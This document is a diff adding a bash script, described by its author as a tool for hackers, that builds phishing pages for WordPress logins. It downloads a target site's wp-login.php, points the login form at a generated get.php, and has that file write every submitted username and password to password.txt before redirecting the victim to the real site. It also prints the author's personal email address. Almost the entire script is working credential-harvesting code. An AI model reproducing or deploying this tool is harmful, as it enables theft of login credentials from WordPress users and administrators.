@@ -1,0 +1,177 @@
+#!/bin/bash
+# In the name of god
+# Wordpress Phishing Page Maker
+# Coded by ksrvco
+# Version 1.0
+reset                  
+echo -e "
+ __        ______  ____  __  __ 
+ \ \      / /  _ \|  _ \|  \/  |
+  \ \ /\ / /| |_) | |_) | |\/| |
+   \ V  V / |  __/|  __/| |  | |
+    \_/\_/  |_|   |_|   |_|  |_| v1.0
+                               
+"
+echo ""
+echo ""
+for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
+echo ""
+echo -e "\e[95m [+] Program name: WPPM - Wordpress Phishing Page Maker"
+echo -e "\e[95m [+] Coded by: ksrvco"
+echo -e "\e[95m [+] Version: 1.0"
+echo -e "\e[95m [+] Contact: flower.k2000@gmail.com"
+echo -e "\e[95m [+] Tested on: Ubuntu , Kali linux , Mint , ParrotSecOS"
+echo ""
+for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
+echo ""
+echo -e "\e[93m Options Of Tool: "
+echo ""
+echo "     1. Start"
+echo "     2. About"
+echo "     3. Contact me"
+echo "     4. Exit"
+echo ""
+read -p " Please choose an option: " option
+	if [ $option == "2" ]
+		then
+			clear
+			echo -e "
+ __        ______  ____  __  __ 
+ \ \      / /  _ \|  _ \|  \/  |
+  \ \ /\ / /| |_) | |_) | |\/| |
+   \ V  V / |  __/|  __/| |  | |
+    \_/\_/  |_|   |_|   |_|  |_| v1.0
+                               
+"
+			echo ""
+			echo "========================="
+			echo -e "\e[91m About this tool: "
+			echo "========================="
+			echo ""
+			echo " With this tool you can make phishing pages for wordpress portals that helps"
+			echo " an hacker for doing phishing attacks."
+			echo ""
+			sleep 10
+			exit
+	elif [ $option == "3" ]
+		then
+            clear
+            echo -e "
+ __        ______  ____  __  __ 
+ \ \      / /  _ \|  _ \|  \/  |
+  \ \ /\ / /| |_) | |_) | |\/| |
+   \ V  V / |  __/|  __/| |  | |
+    \_/\_/  |_|   |_|   |_|  |_| v1.0
+                               
+"
+			echo ""
+			echo "============================"
+			echo -e "\e[91m Contact me: "
+			echo "============================"
+			echo ""
+			echo " Gmail: flower.k2000@gmail.com"
+			echo ""
+			sleep 10
+			exit
+	elif [ $option == "4" ]
+		then
+			clear
+			exit
+	elif [ $option == "1" ]
+		then
+			clear
+			echo -e "
+ __        ______  ____  __  __ 
+ \ \      / /  _ \|  _ \|  \/  |
+  \ \ /\ / /| |_) | |_) | |\/| |
+   \ V  V / |  __/|  __/| |  | |
+    \_/\_/  |_|   |_|   |_|  |_| v1.0
+                               
+"
+			echo ""
+			echo "========================="
+			echo -e "\e[91m Starting Steps: "
+			echo "========================="
+			echo ""
+			read -p " Choose an directory: " dir
+			read -p " Enter site address(example: www.site.com) : " site
+			echo "<?php" > $dir/get.php
+			echo "header("\"Location: http://$site"\");" >> $dir/get.php
+			echo """$""handle = fopen("\"password.txt"\", "\"a"\");" >> $dir/get.php
+			echo "foreach(""$""_GET as ""$""variable => ""$""value) {" >> $dir/get.php
+			echo "   fwrite(""$""handle, ""$""variable);" >> $dir/get.php
+			echo "   fwrite(""$""handle, "\""=""\");" >> $dir/get.php
+			echo "   fwrite(""$""handle, ""$""value);" >> $dir/get.php
+			echo "   fwrite(""$""handle, "\""\r\n""\");" >> $dir/get.php
+			echo "}" >> $dir/get.php
+			echo "fwrite(""$""handle, "\""\r\n""\");" >> $dir/get.php
+			echo "fclose(""$""handle);" >> $dir/get.php
+			echo "exit;" >> $dir/get.php
+			echo "?>" >> $dir/get.php
+			chmod 777 $dir/get.php
+			echo ""
+			read -p " Choose type of protocol (1.http   2.https) : " protocol
+			if [ $protocol == "1" ]
+				then
+				clear
+				echo ""
+				echo ""
+				echo "========================="
+				echo -e "\e[91m Starting Steps: "
+				echo "========================="
+				echo ""
+				curl --silent http://$site/wp-login.php > $dir/index.php
+				sed -i "s/http:\/\/$site\/wp-login.php/get.php/" $dir/index.php
+				chmod 777 $dir/index.php
+				sed -i "s/post/GET/" $dir/index.php
+				clear
+				echo ""
+				echo ""
+				echo "========================="
+				echo -e "\e[91m Complated! "
+				echo "========================="
+				echo ""
+				echo " Your Phishing page created and saved on your selected directory."
+				echo " Now you can move index.php and get.php files on your server or host."
+				sleep 10
+				clear
+				exit
+			elif [ $protocol == "2" ]
+                                then
+                                clear
+                                echo ""
+                                echo ""
+				echo "========================="
+                                echo -e "\e[91m Starting Steps: "
+				echo "========================="
+                                echo ""
+                                curl --silent https://$site/wp-login.php > $dir/index.php
+                                sed -i "s/https:\/\/$site\/wp-login.php/get.php/" $dir/index.php
+				chmod 777 $dir/index.php
+                                sed -i "s/post/GET/" $dir/index.php
+                                clear
+                                echo ""
+                                echo ""
+				echo "========================="
+                                echo -e "\e[91m Complated! "
+				echo "========================="
+                                echo ""
+                                echo " Your Phishing page created and saved on your selected directory."
+                                echo " Now you can move index.php and get.php files on your server or host."
+                                sleep 10
+                                clear
+                                exit
+
+			fi
+	else
+		clear
+		echo ""
+		echo "========================="
+                echo -e "\e[91m Wrong Selection! "
+		echo "========================="
+		sleep 4
+		exit
+	fi
+exit
+# coded by ksrvco
+# Wordpress phishing page maker v1.0
